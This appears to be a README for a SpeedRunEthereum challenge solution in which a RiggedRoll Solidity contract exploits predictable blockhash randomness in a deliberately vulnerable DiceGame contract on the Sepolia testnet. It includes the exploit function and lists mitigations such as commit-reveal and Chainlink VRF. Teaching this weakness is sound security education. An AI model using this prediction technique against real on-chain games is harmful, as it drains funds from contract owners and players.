# 🎲 Dice Game Challenge - Exploit Blockchain Randomness

## Overview

This project is a **SpeedRunEthereum** challenge solution that demonstrates how to exploit weak randomness in smart contracts. The challenge teaches developers why using `blockhash()` for random number generation on a public blockchain is insecure and how to predict outcomes ahead of time.

## 🎯 Challenge Objectives

1. **Understand blockchain randomness vulnerabilities** - Learn why `blockhash()` is predictable
2. **Analyze vulnerable smart contracts** - Trace the DiceGame contract's randomness logic
3. **Create an attacking contract** - Build RiggedRoll to predict and exploit the vulnerability
4. **Deploy to testnet** - Practice real-world deployment and verification

## 📁 Project Structure

```
mydicergame/
├── packages/
│   ├── hardhat/              # Smart contracts & deployment scripts
│   │   ├── contracts/
│   │   │   ├── DiceGame.sol  # Vulnerable target contract
│   │   │   └── RiggedRoll.sol # Our exploiting contract
│   │   ├── deploy/
│   │   │   └── 01_deploy_riggedRoll.ts
│   │   └── hardhat.config.ts
│   └── nextjs/               # Frontend application
│       └── app/dice/page.tsx # Dice game UI
└── vercel.json               # Vercel deployment config
```

## 🔍 Technical Details

### Vulnerability Analysis

The DiceGame contract generates random numbers using:

```solidity
bytes32 prevHash = blockhash(block.number - 1);
bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
uint256 roll = uint256(hash) % 16;  // Returns 0-15
```

**Why it's vulnerable:**
- ✗ All blockchain data is **public** - anyone can read `blockhash()`
- ✗ Contract address is **known** - it's publicly visible
- ✗ Nonce is **predictable** - it increments each roll
- ✗ Result is **deterministic** - keccak256 always produces the same output for same input

### RiggedRoll Solution

Our exploit contract:
1. Predicts the exact random number **before** calling `rollTheDice()`
2. Only calls `rollTheDice()` when the predicted roll is **0-5** (winning numbers)
3. Uses `receive()` to accept ETH
4. Includes `withdraw()` to retrieve winnings

```solidity
function riggedRoll() public payable {
    // Predict the same way DiceGame does
    bytes32 prevHash = blockhash(block.number - 1);
    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
    uint256 roll = uint256(hash) % 16;
    
    // Only call if we'll win (0-5)
    if (roll <= 5) {
        diceGame.rollTheDice{ value: 0.002 ether }();
    }
}
```

## 🚀 Deployment

### Contracts Deployed to Sepolia Testnet

| Contract | Address | Status |
|----------|---------|--------|
| **DiceGame** | `0x5d5293F9F43f90c66E1DD677b0ce11e73a1204ff` | ✅ Verified |
| **RiggedRoll** | `0x34308f30b3fECAb955a2c6E32e7Ee0EFD873C98F` | ✅ Verified |

### Frontend

**Live Application:** https://dice-game-rigged-2025-6lo8jtrkk-kohens-projects.vercel.app

The frontend allows users to:
- Connect their wallet (MetaMask, etc.)
- Request test ETH from faucet
- Roll the dice manually
- View contract balances and transactions

## 📊 Key Learnings

✅ **Blockchain Security**
- Understand why true randomness is hard on deterministic blockchains
- Learn about entropy sources and their limitations

✅ **Smart Contract Patterns**
- `receive()` function for accepting ETH
- `Ownable` pattern for access control
- `call` with value transfer
- Keccak256 hashing

✅ **Testing & Deployment**
- Deploy to public testnet (Sepolia)
- Contract verification on block explorers
- Frontend integration with web3 libraries

✅ **Security Best Practices**
- Never use `blockhash()` for randomness
- Consider commit-reveal schemes
- Use Chainlink VRF for true randomness
- Understand attack vectors in your contracts

## 💡 Better Randomness Solutions

1. **Commit-Reveal Scheme** - Two-phase approach to hide information
2. **Chainlink VRF** - Verifiable Random Function (recommended)
3. **Oracles** - External data sources
4. **Future Improvement** - Ethereum will have built-in randomness (EIP-4399)

## 🛠️ Commands

```bash
# Install dependencies
yarn install

# Start local blockchain
yarn chain

# Deploy contracts
yarn deploy --network sepolia

# Verify contracts
yarn verify --network sepolia

# Build frontend
cd packages/nextjs && yarn build

# Deploy to Vercel
vercel --prod
```

## 📝 Files Modified

- ✅ `packages/hardhat/contracts/RiggedRoll.sol` - Implemented exploit contract
- ✅ `packages/hardhat/deploy/01_deploy_riggedRoll.ts` - Uncommented deployment script
- ✅ `packages/hardhat/hardhat.config.ts` - Added Sepolia configuration
- ✅ `packages/nextjs/scaffold.config.ts` - Set target network to Sepolia
- ✅ `package.json` - Removed yarn version constraint for Vercel compatibility

## 🎓 Educational Value

This challenge demonstrates:
- How to identify smart contract vulnerabilities
- Practical exploitation techniques
- The importance of proper randomness sources
- End-to-end blockchain development workflow

## ⚠️ Disclaimer

This is an **educational project** designed to teach security concepts. The exploit shown here is intentionally allowed in the challenge environment. In production, such vulnerabilities should be:
- Identified during security audits
- Reported through responsible disclosure
- Fixed before contract deployment

## 📚 Resources

- [Randomness in Solidity](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties)
- [Chainlink VRF Documentation](https://docs.chain.link/vrf)
- [SpeedRunEthereum](https://speedrunethereum.com)
- [Scaffold-ETH 2](https://scaffoldeth.io)